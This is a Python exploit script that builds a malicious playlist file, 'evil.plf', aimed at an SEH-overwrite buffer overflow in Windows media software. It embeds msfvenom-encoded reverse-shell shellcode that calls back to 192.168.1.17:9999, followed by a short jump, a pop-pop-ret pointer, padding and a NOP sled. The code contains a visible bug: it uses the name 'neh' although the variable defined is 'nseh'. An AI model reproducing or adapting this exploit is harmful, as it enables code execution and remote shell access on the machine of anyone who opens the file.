#!/usr/bin/python -w
  
filename="evil.plf"
#Author:tripster 

#  msfvenom --platform windows -a x86 -p windows/shell_reverse_tcp LHOST=192.168.1.17 LPORT=9999 -e x86/shikata_ga_nai -b '\x00\x0A\x0D\x1A' -f python -v shellcode
shellcode =  b""                                                           
shellcode += b"\xbf\x2b\x99\xbf\x63\xda\xd3\xd9\x74\x24\xf4"               
shellcode += b"\x5d\x2b\xc9\xb1\x52\x31\x7d\x12\x83\xed\xfc"               
shellcode += b"\x03\x56\x97\x5d\x96\x54\x4f\x23\x59\xa4\x90"               
shellcode += b"\x44\xd3\x41\xa1\x44\x87\x02\x92\x74\xc3\x46"               
shellcode += b"\x1f\xfe\x81\x72\x94\x72\x0e\x75\x1d\x38\x68"               
shellcode += b"\xb8\x9e\x11\x48\xdb\x1c\x68\x9d\x3b\x1c\xa3"               
shellcode += b"\xd0\x3a\x59\xde\x19\x6e\x32\x94\x8c\x9e\x37"               
shellcode += b"\xe0\x0c\x15\x0b\xe4\x14\xca\xdc\x07\x34\x5d"               
shellcode += b"\x56\x5e\x96\x5c\xbb\xea\x9f\x46\xd8\xd7\x56"               
shellcode += b"\xfd\x2a\xa3\x68\xd7\x62\x4c\xc6\x16\x4b\xbf"               
shellcode += b"\x16\x5f\x6c\x20\x6d\xa9\x8e\xdd\x76\x6e\xec"               
shellcode += b"\x39\xf2\x74\x56\xc9\xa4\x50\x66\x1e\x32\x13"               
shellcode += b"\x64\xeb\x30\x7b\x69\xea\x95\xf0\x95\x67\x18"               
shellcode += b"\xd6\x1f\x33\x3f\xf2\x44\xe7\x5e\xa3\x20\x46"
shellcode += b"\x5e\xb3\x8a\x37\xfa\xb8\x27\x23\x77\xe3\x2f"
shellcode += b"\x80\xba\x1b\xb0\x8e\xcd\x68\x82\x11\x66\xe6"
shellcode += b"\xae\xda\xa0\xf1\xd1\xf0\x15\x6d\x2c\xfb\x65"
shellcode += b"\xa4\xeb\xaf\x35\xde\xda\xcf\xdd\x1e\xe2\x05"
shellcode += b"\x71\x4e\x4c\xf6\x32\x3e\x2c\xa6\xda\x54\xa3"
shellcode += b"\x99\xfb\x57\x69\xb2\x96\xa2\xfa\xb7\x66\xae"
shellcode += b"\xf5\xaf\x64\xae\x2e\x3f\xe0\x48\x5a\x2f\xa4"
shellcode += b"\xc3\xf3\xd6\xed\x9f\x62\x16\x38\xda\xa5\x9c"
shellcode += b"\xcf\x1b\x6b\x55\xa5\x0f\x1c\x95\xf0\x6d\x8b"
shellcode += b"\xaa\x2e\x19\x57\x38\xb5\xd9\x1e\x21\x62\x8e"
shellcode += b"\x77\x97\x7b\x5a\x6a\x8e\xd5\x78\x77\x56\x1d"
shellcode += b"\x38\xac\xab\xa0\xc1\x21\x97\x86\xd1\xff\x18"
shellcode += b"\x83\x85\xaf\x4e\x5d\x73\x16\x39\x2f\x2d\xc0"
shellcode += b"\x96\xf9\xb9\x95\xd4\x39\xbf\x99\x30\xcc\x5f"
shellcode += b"\x2b\xed\x89\x60\x84\x79\x1e\x19\xf8\x19\xe1"
shellcode += b"\xf0\xb8\x2a\xa8\x58\xe8\xa2\x75\x09\xa8\xae"
shellcode += b"\x85\xe4\xef\xd6\x05\x0c\x90\x2c\x15\x65\x95"
shellcode += b"\x69\x91\x96\xe7\xe2\x74\x98\x54\x02\x5d"
nseh="\xEB\x06\x90\x90" #jump short 6 positions
seh="\x19\x76\x61\x61" #pop pop ret pointer to dll 
buffer="A" *608  + neh + seh + "\x90" * 30 +shellcode
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
